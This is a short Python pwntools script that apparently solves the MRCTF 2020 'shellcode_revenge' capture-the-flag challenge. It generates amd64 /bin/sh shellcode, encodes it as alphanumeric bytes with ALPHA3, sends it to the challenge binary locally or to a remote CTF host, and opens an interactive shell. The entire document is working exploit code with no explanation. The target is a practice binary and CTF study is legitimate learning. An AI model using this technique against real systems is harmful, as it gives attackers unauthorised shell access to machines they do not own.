from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# f = open('./shellcode.bin','wb')
# shellcode = asm(shellcraft.amd64.sh())
# f.write(shellcode)
# f.close

# python ./ALPHA3.py x64 ascii mixedcase rax --input="shellcode.bin" > payload.bin


io = process('./mrctf2020_shellcode_revenge')
# io = remote('node4.buuoj.cn',28282)
elf = ELF('./mrctf2020_shellcode_revenge')

f = open('payload.bin','rb')
payload = f.read()
print(payload)

io.send(payload)
io.interactive()